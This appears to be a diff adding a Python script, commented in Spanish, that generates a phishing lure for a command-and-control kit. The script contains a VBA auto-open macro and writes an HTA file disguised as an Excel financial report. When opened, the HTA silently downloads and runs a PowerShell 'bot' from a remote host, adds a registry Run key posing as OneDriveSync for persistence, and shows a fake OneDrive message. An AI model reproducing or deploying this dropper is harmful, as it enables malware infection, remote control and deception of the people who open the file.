@@ -1,0 +1,106 @@
+#!/usr/bin/env python3
+"""
+Genera un documento Excel con macro maliciosa
+Requiere: pip install openpyxl
+"""
+
+import zipfile
+import os
+from pathlib import Path
+
+# Crear estructura XLSM manualmente (es un ZIP con XML)
+output_dir = Path.home() / "C2-suite" / "c2_server" / "static" / "payloads"
+output_dir.mkdir(parents=True, exist_ok=True)
+
+# VBA macro que descarga y ejecuta el bot
+vba_code = '''
+Attribute VB_Name = "ThisWorkbook"
+Private Sub Workbook_Open()
+    Dim shell As Object
+    Set shell = CreateObject("WScript.Shell")
+    
+    ' Descargar bot.ps1
+    shell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri 'http://192.168.1.14:8000/static/payloads/bot_stealth.ps1' -OutFile '$env:TEMP\\sysupdate.ps1'""", 0, False
+    
+    ' Ejecutar bot
+    shell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $env:TEMP\\sysupdate.ps1", 0, False
+    
+    ' Mostrar documento falso
+    MsgBox "Documento cargado correctamente.", vbInformation, "OneDrive"
+End Sub
+'''
+
+# Crear XLSM básico (simplificado - en producción usarías openpyxl o xlwings)
+# Para el lab, creamos un archivo .hta que parece Excel
+
+hta_content = '''<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Reporte Financiero Q3 - Excel</title>
+<hta:application id="ExcelDoc" applicationname="Excel" border="thin" caption="yes" showintaskbar="yes" windowstate="normal"/>
+<script language="VBScript">
+Sub Window_OnLoad
+    Window.ResizeTo 800, 600
+    Window.MoveTo 200, 100
+    
+    ' Descargar bot
+    Dim shell, http
+    Set shell = CreateObject("WScript.Shell")
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    
+    http.Open "GET", "http://192.168.1.14:8000/static/payloads/bot_stealth.ps1", False
+    http.Send
+    
+    Dim fso, file
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set file = fso.CreateTextFile(shell.ExpandEnvironmentStrings("%TEMP%") & "\\sysupdate.ps1", True)
+    file.Write http.ResponseText
+    file.Close
+    
+    ' Ejecutar
+    shell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & shell.ExpandEnvironmentStrings("%TEMP%") & "\\sysupdate.ps1""", 0, False
+    
+    ' Persistencia
+    shell.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSync", _
+        "powershell -WindowStyle Hidden -File """ & shell.ExpandEnvironmentStrings("%TEMP%") & "\\sysupdate.ps1""", "REG_SZ"
+End Sub
+</script>
+<style>
+body { font-family: Calibri, sans-serif; margin: 0; background: #217346; }
+.header { background: #217346; color: white; padding: 10px; font-size: 14px; }
+.toolbar { background: #f3f2f1; padding: 8px; border-bottom: 1px solid #d1d1d1; }
+.toolbar button { background: white; border: 1px solid #d1d1d1; padding: 4px 12px; margin-right: 4px; font-size: 12px; }
+.sheet { background: white; padding: 20px; }
+table { border-collapse: collapse; width: 100%; font-size: 11px; }
+th { background: #d9e1f2; border: 1px solid #b4c7dc; padding: 6px; text-align: left; }
+td { border: 1px solid #d1d1d1; padding: 5px; }
+.green { background: #c6efce; }
+.red { background: #ffc7ce; }
+</style>
+</head>
+<body>
+<div class="header">📊 Reporte_Financiero_Q3.xlsx - Excel</div>
+<div class="toolbar">
+<button>Archivo</button><button>Inicio</button><button>Insertar</button>
+<button>Diseño de página</button><button>Fórmulas</button><button>Datos</button>
+<button>Revisar</button><button>Vista</button>
+</div>
+<div class="sheet">
+<h3>Reporte Financiero Q3 2026</h3>
+<table>
+<tr><th>Concepto</th><th>Q1</th><th>Q2</th><th>Q3</th><th>Variación</th></tr>
+<tr><td>Ingresos</td><td>$2.4M</td><td>$2.8M</td><td class="green">$3.2M</td><td>+14%</td></tr>
+<tr><td>Gastos</td><td>$1.8M</td><td>$2.1M</td><td class="red">$2.5M</td><td>+19%</td></tr>
+<tr><td>Beneficio Neto</td><td>$0.6M</td><td>$0.7M</td><td class="green">$0.7M</td><td>+0%</td></tr>
+<tr><td>ROI</td><td>25%</td><td>28%</td><td class="green">32%</td><td>+4pp</td></tr>
+</table>
+<p style="color: #999; font-size: 10px; margin-top: 20px;">Generado por Microsoft Excel • OneDrive Business</p>
+</div>
+</body>
+</html>'''
+
+with open(output_dir / "Reporte_Q3.hta", "w") as f:
+    f.write(hta_content)
+
+print("[+] Reporte_Q3.hta creado (parece Excel, ejecuta VBS)")
